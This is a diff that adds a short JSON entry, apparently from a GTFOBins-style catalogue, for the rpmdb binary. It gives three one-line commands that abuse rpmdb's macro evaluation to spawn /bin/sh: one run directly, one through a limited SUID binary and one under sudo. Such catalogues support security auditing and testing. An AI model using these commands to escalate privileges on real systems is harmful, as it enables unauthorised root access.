@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "shell": [
+      {
+        
+        "code": "rpmdb --eval '%(/bin/sh 1>&2)'\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        
+        "code": "./rpmdb --eval '%(/bin/sh 1>&2)'\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "sudo rpmdb --eval '%(/bin/sh 1>&2)'\n"
+      }
+    ]
+  }
+}
